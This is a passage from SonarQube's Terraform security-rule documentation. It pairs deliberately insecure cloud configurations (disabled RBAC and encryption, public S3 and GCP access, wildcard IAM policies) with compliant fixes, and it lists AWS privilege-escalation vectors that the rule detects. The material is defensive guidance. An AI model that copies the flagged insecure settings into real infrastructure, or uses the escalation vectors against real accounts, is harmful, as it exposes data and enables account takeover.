resource &#34;azurerm_storage_container&#34; &#34;example&#34; {
  container_access_type &#61; &#34;private&#34;
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/cache/" rel="nofollow">Redis Caches</a>:</p>
<pre data-diff-id="5" data-diff-type="compliant">
resource &#34;azurerm_redis_cache&#34; &#34;example&#34; {
  name &#61; &#34;example-cache&#34;

  redis_configuration {
    enable_authentication &#61; true
  }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Boken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://cwe.mitre.org/data/definitions/668" rel="nofollow">MITRE, CWE-668</a> - Exposure of Resource to Wrong Sphere </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6383">
              terraform:S6383
            </a>
          </td>
          <td>
            <details>
              <p>Disabling Role-Based Access Control (RBAC) on Azure resources can reduce an organization’s ability to protect itself against access controls being
compromised.</p>
<p>To be considered safe, access controls must follow the principle of least privilege and correctly segregate duties amongst users. RBAC helps
enforce these practices by adapting the organization’s access control needs into explicit role-based policies: It helps keeping access controls
maintainable and sustainable.</p>
<p>Furthermore, RBAC allows operations teams to work faster during a security incident. It helps to mitigate account theft or intrusions by quickly
shutting down accesses.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> This Azure resource is essential for the information system infrastructure. </li><li> This Azure resource is essential for mission-critical functions. </li><li> Compliance policies require access to this resource to be enforced through the use of Role-Based Access Control. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Enable Azure RBAC when the Azure resource supports it. </li><li> For Kubernetes clusters, enable Azure RBAC if Azure AD integration is supported. Otherwise, use the built-in Kubernetes RBAC. </li></ul>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://azure.microsoft.com/fr-fr/services/kubernetes-service/" rel="nofollow">Azure Kubernetes Services</a>:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
resource &#34;azurerm_kubernetes_cluster&#34; &#34;example&#34; {
  role_based_access_control {
    enabled &#61; false # Sensitive
  }
}

resource &#34;azurerm_kubernetes_cluster&#34; &#34;example2&#34; {
  role_based_access_control {
    enabled &#61; true

    azure_active_directory {
      managed &#61; true
      azure_rbac_enabled &#61; false # Sensitive
    }
  }
}
</pre>
<p>For <a href="https://azure.microsoft.com/fr-fr/services/key-vault/" rel="nofollow">Key Vaults</a>:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
resource &#34;azurerm_key_vault&#34; &#34;example&#34; {
  enable_rbac_authorization &#61; false # Sensitive
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://azure.microsoft.com/fr-fr/services/kubernetes-service/" rel="nofollow">Azure Kubernetes Services</a>:</p>
<pre data-diff-id="1" data-diff-type="compliant">
resource &#34;azurerm_kubernetes_cluster&#34; &#34;example&#34; {
  role_based_access_control {
    enabled &#61; true
  }
}

resource &#34;azurerm_kubernetes_cluster&#34; &#34;example&#34; {
  role_based_access_control {
    enabled &#61; true

    azure_active_directory {
      managed &#61; true
      azure_rbac_enabled &#61; true
    }
  }
}
</pre>
<p>For <a href="https://azure.microsoft.com/fr-fr/services/key-vault/" rel="nofollow">Key Vaults</a>:</p>
<pre data-diff-id="2" data-diff-type="compliant">
resource &#34;azurerm_key_vault&#34; &#34;example&#34; {
  enable_rbac_authorization   &#61; true
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Boken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://cwe.mitre.org/data/definitions/668" rel="nofollow">MITRE, CWE-668</a> - Exposure of Resource to Wrong Sphere </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6382">
              terraform:S6382
            </a>
          </td>
          <td>
            <details>
              <p>Disabling certificate-based authentication can reduce an organization’s ability to react against attacks on its critical functions and data.</p>
<p>Azure offers various authentication options to access resources: Anonymous connections, Basic authentication, password-based authentication, and
certificate-based authentication.</p>
<p>Choosing certificate-based authentication helps bring client/host trust by allowing the host to verify the client and vice versa. It cannot be
forged or forwarded by a man-in-the-middle eavesdropper, and the certificate’s private key is never sent over the network so it’s harder to steal than
a password.</p>
<p>In case of a security incident, certificates help bring investigators traceability and allow security operations teams to react faster. For
example, all compromised certificates could be revoked individually, or an issuing certificate could be revoked which causes all the certificates it
issued to become untrusted.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> This Azure resource is essential for the information system infrastructure. </li><li> This Azure resource is essential for mission-critical functions. </li><li> Compliance policies require access to this resource to be authenticated with certificates. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Enable certificate-based authentication.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://azure.microsoft.com/en-us/services/app-service/" rel="nofollow">App Service</a>:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
resource &#34;azurerm_app_service&#34; &#34;example&#34; {
  client_cert_enabled &#61; false # Sensitive
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/logic-apps/" rel="nofollow">Logic App Standards</a> and <a href="https://azure.microsoft.com/en-us/services/functions/" rel="nofollow">Function Apps</a>:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
resource &#34;azurerm_function_app&#34; &#34;example&#34; {
  client_cert_mode &#61; &#34;Optional&#34; # Sensitive
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/data-factory/" rel="nofollow">Data Factory Linked Services</a>:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
resource &#34;azurerm_data_factory_linked_service_web&#34; &#34;example&#34; {
  authentication_type &#61; &#34;Basic&#34; # Sensitive
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/api-management/" rel="nofollow">API Management</a>:</p>
<pre data-diff-id="4" data-diff-type="noncompliant">
resource &#34;azurerm_api_management&#34; &#34;example&#34; {
  sku_name &#61; &#34;Consumption_1&#34;
  client_certificate_mode &#61; &#34;Optional&#34; # Sensitive
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/app-service/containers/" rel="nofollow">Linux and Windows Web Apps</a>:</p>
<pre data-diff-id="5" data-diff-type="noncompliant">
resource &#34;azurerm_linux_web_app&#34; &#34;example&#34; {
  client_cert_enabled &#61; false # Sensitive
}
resource &#34;azurerm_linux_web_app&#34; &#34;exemple2&#34; {
  client_cert_enabled &#61; true
  client_cert_mode &#61; &#34;Optional&#34; # Sensitive
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://azure.microsoft.com/en-us/services/app-service/" rel="nofollow">App Service</a>:</p>
<pre data-diff-id="1" data-diff-type="compliant">
resource &#34;azurerm_app_service&#34; &#34;example&#34; {
  client_cert_enabled &#61; true
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/logic-apps/" rel="nofollow">Logic App Standards</a> and <a href="https://azure.microsoft.com/en-us/services/functions/" rel="nofollow">Function Apps</a>:</p>
<pre data-diff-id="2" data-diff-type="compliant">
resource &#34;azurerm_function_app&#34; &#34;example&#34; {
  client_cert_mode &#61; &#34;Required&#34;
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/data-factory/" rel="nofollow">Data Factory Linked Services</a>:</p>
<pre data-diff-id="3" data-diff-type="compliant">
resource &#34;azurerm_data_factory_linked_service_web&#34; &#34;example&#34; {
  authentication_type &#61; &#34;ClientCertificate&#34;
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/api-management/" rel="nofollow">API Management</a>:</p>
<pre data-diff-id="4" data-diff-type="compliant">
resource &#34;azurerm_api_management&#34; &#34;example&#34; {
  sku_name &#61; &#34;Consumption_1&#34;
  client_certificate_mode &#61; &#34;Required&#34;
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/app-service/containers/" rel="nofollow">Linux and Windows Web Apps</a>:</p>
<pre data-diff-id="5" data-diff-type="compliant">
resource &#34;azurerm_linux_web_app&#34; &#34;exemple&#34; {
  client_cert_enabled &#61; true
  client_cert_mode &#61; &#34;Required&#34;
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Boken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://cwe.mitre.org/data/definitions/668" rel="nofollow">MITRE, CWE-668</a> - Exposure of Resource to Wrong Sphere </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6317">
              terraform:S6317
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>AWS Identity and Access Management (IAM) is the service that defines access to AWS resources. One of the core components of IAM is the policy
which, when attached to an identity or a resource, defines its permissions. Policies granting permission to an Identity (a User, a Group or Role) are
called identity-based policies. They add the ability to an identity to perform a predefined set of actions on a list of resources.</p>
<p>Here is an example of a policy document defining a limited set of permission that grants a user the ability to manage his own access keys.</p>
<pre>
{
    &#34;Version&#34;: &#34;2012-10-17&#34;,
    &#34;Statement&#34;: [
        {
            &#34;Action&#34;: [
                &#34;iam:CreateAccessKey&#34;,
                &#34;iam:DeleteAccessKey&#34;,
                &#34;iam:ListAccessKeys&#34;,
                &#34;iam:UpdateAccessKey&#34;
            ],
            &#34;Resource&#34;: &#34;arn:aws:iam::245500951992:user/${aws:username}&#34;,
            &#34;Effect&#34;: &#34;Allow&#34;,
            &#34;Sid&#34;: &#34;AllowManageOwnAccessKeys&#34;
        }
    ]
}
</pre>
<p>Privilege escalation generally happens when an identity policy gives an identity the ability to grant more privileges than the ones it already has.
Here is another example of a policy document that hides a privilege escalation. It allows an identity to generate a new access key for any user from
the account, including users with high privileges.</p>
<pre>
{
    &#34;Version&#34;: &#34;2012-10-17&#34;,
    &#34;Statement&#34;: [
        {
            &#34;Action&#34;: [
                &#34;iam:CreateAccessKey&#34;,
                &#34;iam:DeleteAccessKey&#34;,
                &#34;iam:ListAccessKeys&#34;,
                &#34;iam:UpdateAccessKey&#34;
            ],
            &#34;Resource&#34;: &#34;*&#34;,
            &#34;Effect&#34;: &#34;Allow&#34;,
            &#34;Sid&#34;: &#34;AllowManageOwnAccessKeys&#34;
        }
    ]
}
</pre>
<p>Although it looks like it grants a limited set of permissions, this policy would, in practice, give the highest privileges to the identity it’s
attached to.</p>
<p>Privilege escalation is a serious issue as it allows a malicious user to easily escalate to a high privilege identity from a low privilege identity
it took control of.</p>
<p>The example above is just one of many permission escalation vectors. Here is the list of vectors that the rule can detect:</p>
Vector nameSummary<p>Create Policy Version</p><p>Create a new IAM policy and set it as default</p><p>Set Default Policy Version</p><p>Set a different IAM policy version as default</p><p>Create AccessKey</p><p>Create a new access key for any user</p><p>Create Login Profile</p><p>Create a login profile with a password chosen by the attacker</p><p>Update Login Profile</p><p>Update the existing password with one chosen by the attacker</p><p>Attach User Policy</p><p>Attach a permissive IAM policy like &#34;AdministratorAccess&#34; to a user the attacker controls</p><p>Attach Group Policy</p><p>Attach a permissive IAM policy like &#34;AdministratorAccess&#34; to a group containing a user the attacker controls</p><p>Attach Role Policy</p><p>Attach a permissive IAM policy like &#34;AdministratorAccess&#34; to a role that can be assumed by the user the attacker controls</p><p>Put User Policy</p><p>Alter the existing inline IAM policy from a user the attacker controls</p><p>Put Group Policy</p><p>Alter the existing inline IAM policy from a group containing a user that the attacker controls</p><p>Put Role Policy</p><p>Alter an existing inline IAM role policy. The rule will then be assumed by the user that the attacker controls</p><p>Add User to Group</p><p>Add a user that the attacker controls to a group that has a larger range of permissions</p><p>Update Assume Role Policy</p><p>Update a role’s &#34;AssumeRolePolicyDocument&#34; to allow a user the attacker controls to assume it</p><p>EC2</p><p>Create an EC2 instance that will execute with high privileges</p><p>Lambda Create and Invoke</p><p>Create a Lambda function that will execute with high privileges and invoke it</p><p>Lambda Create and Add Permission</p><p>Create a Lambda function that will execute with high privileges and grant permission to invoke it to a user or a service</p><p>Lambda triggered with an external event</p><p>Create a Lambda function that will execute with high privileges and link it to an external event</p><p>Update Lambda code</p><p>Update the code of a Lambda function executing with high privileges</p><p>CloudFormation</p><p>Create a CloudFormation stack that will execute with high privileges</p><p>Data Pipeline</p><p>Create a Pipeline that will execute with high privileges</p><p>Glue Development Endpoint</p><p>Create a Glue Development Endpoint that will execute with high privileges</p><p>Update Glue Dev Endpoint</p><p>Update the associated SSH key for the Glue endpoint</p>
<p>The general recommendation to protect against privilege escalation is to restrict the resources to which sensitive permissions are granted. The
first example above is a good demonstration of sensitive permissions being used with a narrow scope of resources and where no privilege escalation is
possible.</p>
<h3>Noncompliant code example</h3>
<p>This policy allows to update the code of any lambda function. Updating the code of a lambda executing with high privileges will lead to privilege
escalation.</p>
<pre>
resource &#34;aws_iam_policy&#34; &#34;example&#34; {
  name &#61; &#34;example&#34;
  policy &#61;&lt;&lt;EOF
{
    &#34;Version&#34;: &#34;2012-10-17&#34;,
    &#34;Statement&#34;: [
        {
            &#34;Effect&#34;: &#34;Allow&#34;,
            &#34;Action&#34;: [
                &#34;lambda:UpdateFunctionCode&#34;
            ],
            &#34;Resource&#34;: &#34;*&#34;
        }
    ]
}
EOF
}
</pre>
<h3>Compliant solution</h3>
<p>Narrow the policy to only allow to update the code of certain lambda functions.</p>
<pre>
resource &#34;aws_iam_policy&#34; &#34;example&#34; {
  name &#61; &#34;example&#34;
  policy &#61;&lt;&lt;EOF
{
    &#34;Version&#34;: &#34;2012-10-17&#34;,
    &#34;Statement&#34;: [
        {
            &#34;Effect&#34;: &#34;Allow&#34;,
            &#34;Action&#34;: [
                &#34;lambda:UpdateFunctionCode&#34;
            ],
            &#34;Resource&#34;: &#34;arn:aws:lambda:us-east-2:123456789012:function:my-function:1&#34;
        }
    ]
}
EOF
}
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/" rel="nofollow">Rhino Security Labs</a> - AWS IAM Privilege Escalation
  – Methods and Mitigation </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-269</a> - Improper Privilege Management </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6319">
              terraform:S6319
            </a>
          </td>
          <td>
            <details>
              <p>Amazon SageMaker is a managed machine learning service in a hosted production-ready environment. To train machine learning models, SageMaker
instances can process potentially sensitive data, such as personal information that should not be stored unencrypted. In the event that adversaries
physically access the storage media, they cannot decrypt encrypted data.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The instance contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt SageMaker notebook instances that contain sensitive information. Encryption and decryption are handled transparently by
SageMaker, so no further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sagemaker_notebook_instance" rel="nofollow">aws_sagemaker_notebook_instance</a>:</p>
<pre>
resource &#34;aws_sagemaker_notebook_instance&#34; &#34;notebook&#34; {  # Sensitive, encryption disabled by default
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sagemaker_notebook_instance" rel="nofollow">aws_sagemaker_notebook_instance</a>:</p>
<pre>
resource &#34;aws_sagemaker_notebook_instance&#34; &#34;notebook&#34; {
  kms_key_id &#61; aws_kms_key.enc_key.key_id
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/sagemaker/latest/dg/encryption-at-rest.html" rel="nofollow">Protect Data at Rest Using Encryption</a> </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6275">
              terraform:S6275
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Elastic Block Store (EBS) is a block-storage service for Amazon Elastic Compute Cloud (EC2). EBS volumes can be encrypted, ensuring the
security of both data-at-rest and data-in-transit between an instance and its attached EBS storage. In the case that adversaries gain physical access
to the storage medium they are not able to access the data. Encryption can be enabled for specific volumes or for <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html#encryption-by-default" rel="nofollow">all new volumes and snapshots</a>. Volumes created
from snapshots inherit their encryption configuration. A volume created from an encrypted snapshot will also be encrypted by default.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The disk contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt EBS volumes that contain sensitive information. Encryption and decryption are handled transparently by EC2, so no
further modifications to the application are necessary. Instead of enabling encryption for every volume, it is also possible to enable encryption
globally for a specific region. While creating volumes from encrypted snapshots will result in them being encrypted, explicitly enabling this security
parameter will prevent any future unexpected security downgrade.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ebs_volume" rel="nofollow">aws_ebs_volume</a>:</p>
<pre>
resource &#34;aws_ebs_volume&#34; &#34;ebs_volume&#34; {  # Sensitive as encryption is disabled by default
}
</pre>
<pre>
resource &#34;aws_ebs_volume&#34; &#34;ebs_volume&#34; {
  encrypted &#61; false  # Sensitive
}
</pre>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ebs_encryption_by_default" rel="nofollow">aws_ebs_encryption_by_default</a>:</p>
<pre>
resource &#34;aws_ebs_encryption_by_default&#34; &#34;default_encryption&#34; {
  enabled &#61; false  # Sensitive
}
</pre>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/launch_configuration" rel="nofollow">aws_launch_configuration</a>:</p>
<pre>
resource &#34;aws_launch_configuration&#34; &#34;launch_configuration&#34; {
  root_block_device {  # Sensitive as encryption is disabled by default
  }
  ebs_block_device {  # Sensitive as encryption is disabled by default
  }
}
</pre>
<pre>
resource &#34;aws_launch_configuration&#34; &#34;launch_configuration&#34; {
  root_block_device {
    encrypted &#61; false  # Sensitive
  }
  ebs_block_device {
    encrypted &#61; false  # Sensitive
  }
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ebs_volume" rel="nofollow">aws_ebs_volume</a>:</p>
<pre>
resource &#34;aws_ebs_volume&#34; &#34;ebs_volume&#34; {
  encrypted &#61; true
}
</pre>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ebs_encryption_by_default" rel="nofollow">aws_ebs_encryption_by_default</a>:</p>
<pre>
resource &#34;aws_ebs_encryption_by_default&#34; &#34;default_encryption&#34; {
  enabled &#61; true  # Optional, default is &#34;true&#34;
}
</pre>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/launch_configuration" rel="nofollow">aws_launch_configuration</a>:</p>
<pre>
resource &#34;aws_launch_configuration&#34; &#34;launch_configuration&#34; {
  root_block_device {
    encrypted &#61; true
  }
  ebs_block_device {
    encrypted &#61; true
  }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html" rel="nofollow">Amazon EBS encryption</a> </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6270">
              terraform:S6270
            </a>
          </td>
          <td>
            <details>
              <p>Resource-based policies granting access to all users can lead to information leakage.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The AWS resource stores or processes sensitive data. </li><li> The AWS resource is designed to be private. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to implement the least privilege principle, i.e. to grant necessary permissions only to users for their required tasks. In the
context of resource-based policies, list the principals that need the access and grant to them only the required privileges.</p>
<h2>Sensitive Code Example</h2>
<p>This policy allows all users, including anonymous ones, to access an S3 bucket:</p>
<pre>
resource &#34;aws_s3_bucket_policy&#34; &#34;mynoncompliantpolicy&#34; {  # Sensitive
  bucket &#61; aws_s3_bucket.mybucket.id
  policy &#61; jsonencode({
    Id &#61; &#34;mynoncompliantpolicy&#34;
    Version &#61; &#34;2012-10-17&#34;
    Statement &#61; [{
            Effect &#61; &#34;Allow&#34;
            Principal &#61; {
                AWS &#61; &#34;*&#34;
            }
            Action &#61; [
                &#34;s3:PutObject&#34;
            ]
            Resource: &#34;${aws_s3_bucket.mybucket.arn}/*&#34;
        }
    ]
  })
}
</pre>
<h2>Compliant Solution</h2>
<p>This policy allows only the authorized users:</p>
<pre>
resource &#34;aws_s3_bucket_policy&#34; &#34;mycompliantpolicy&#34; {
  bucket &#61; aws_s3_bucket.mybucket.id
  policy &#61; jsonencode({
    Id &#61; &#34;mycompliantpolicy&#34;
    Version &#61; &#34;2012-10-17&#34;
    Statement &#61; [{
            Effect &#61; &#34;Allow&#34;
            Principal &#61; {
                AWS &#61; [
                    &#34;arn:aws:iam::${data.aws_caller_identity.current.account_id}:root&#34;
                ]
            }
            Action &#61; [
                &#34;s3:PutObject&#34;
            ]
            Resource &#61; &#34;${aws_s3_bucket.mybucket.arn}/*&#34;
        }
    ]
  })
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege" rel="nofollow">AWS Documentation</a> - Grant least
  privilege </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6404">
              terraform:S6404
            </a>
          </td>
          <td>
            <details>
              <p>Granting public access to GCP resources may reduce an organization’s ability to protect itself against attacks or theft of its GCP resources.<br />
Security incidents associated with misuse of public access include disruption of critical functions, data theft, and additional costs due to resource
overload.</p>
<p>To be as prepared as possible in the event of a security incident, authentication combined with fine-grained permissions helps maintain the
principle of defense in depth and trace incidents back to the perpetrators.</p>
<p>GCP also provides the ability to grant access to a large group of people:</p>
<ul><li> If public access is granted to all Google users, the impact of a data theft is the same as if public access is granted to all Internet users.
  </li><li> If access is granted to a large Google group, the impact of a data theft is limited based on the size of the group. </li></ul>
<p>The only thing that changes in these cases is the ability to track user access in the event of an incident.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> This GCP resource is essential to the information system infrastructure. </li><li> This GCP resource is essential to mission-critical functions. </li><li> This GCP resource stores or processes sensitive data. </li><li> Compliance policies require that access to this resource be authenticated. </li></ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Explicitly set access to this resource or function as private.</p>
<h2>Sensitive Code Example</h2>
<p>For IAM resources:</p>
<pre>
resource &#34;google_cloudfunctions_function_iam_binding&#34; &#34;example&#34; {
  members &#61; [
    &#34;allUsers&#34;,              # Sensitive
    &#34;allAuthenticatedUsers&#34;, # Sensitive
  ]
}

resource &#34;google_cloudfunctions_function_iam_member&#34; &#34;example&#34; {
  member &#61; &#34;allAuthenticatedUsers&#34; # Sensitive
}
</pre>
<p>For ACL resources:</p>
<pre>
resource &#34;google_storage_bucket_access_control&#34; &#34;example&#34; {
  entity &#61; &#34;allUsers&#34; # Sensitive
}

resource &#34;google_storage_bucket_acl&#34; &#34;example&#34; {
  role_entity &#61; [
    &#34;READER:allUsers&#34;,              # Sensitive
    &#34;READER:allAuthenticatedUsers&#34;, # Sensitive
  ]
}
</pre>
<p>For container clusters:</p>
<pre>
resource &#34;google_container_cluster&#34; &#34;example&#34; {
  private_cluster_config {
    enable_private_nodes    &#61; false # Sensitive
    enable_private_endpoint &#61; false # Sensitive
  }
}
</pre>
<h2>Compliant Solution</h2>
<p>For IAM resources:</p>
<pre>
resource &#34;google_cloudfunctions_function_iam_binding&#34; &#34;example&#34; {
  members &#61; [
    &#34;serviceAccount:${google_service_account.example.email}&#34;,
    &#34;group:${var.example_group}&#34;
  ]
}

resource &#34;google_cloudfunctions_function_iam_member&#34; &#34;example&#34; {
  member &#61; &#34;user:${var.example_user}&#34; # Sensitive
}
</pre>
<p>For ACL resources:</p>
<pre>
resource &#34;google_storage_bucket_access_control&#34; &#34;example&#34; {
  entity &#61; &#34;user-${var.example_user]&#34;
}

resource &#34;google_storage_bucket_acl&#34; &#34;example&#34; {
  role_entity &#61; [
    &#34;READER:user-name&#64;example.com&#34;,
    &#34;READER:group-admins&#64;example.com&#34;
  ]
}
</pre>
<p>For container clusters:</p>
<pre>
resource &#34;google_container_cluster&#34; &#34;example&#34; {
  private_cluster_config {
    enable_private_nodes    &#61; true
    enable_private_endpoint &#61; true
  }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Boken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://cwe.mitre.org/data/definitions/668" rel="nofollow">MITRE, CWE-668</a> - Exposure of Resource to Wrong Sphere </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6327">
              terraform:S6327
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Simple Notification Service (SNS) is a managed messaging service for application-to-application (A2A) and application-to-person (A2P)
communication. SNS topics allows publisher systems to fanout messages to a large number of subscriber systems. Amazon SNS allows to encrypt messages
when they are received. In the case that adversaries gain physical access to the storage medium or otherwise leak a message they are not able to
access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The topic contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt SNS topics that contain sensitive information. Encryption and decryption are handled transparently by SNS, so no
further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sns_topic" rel="nofollow">aws_sns_topic</a>:</p>
<pre>
resource &#34;aws_sns_topic&#34; &#34;topic&#34; {  # Sensitive, encryption disabled by default
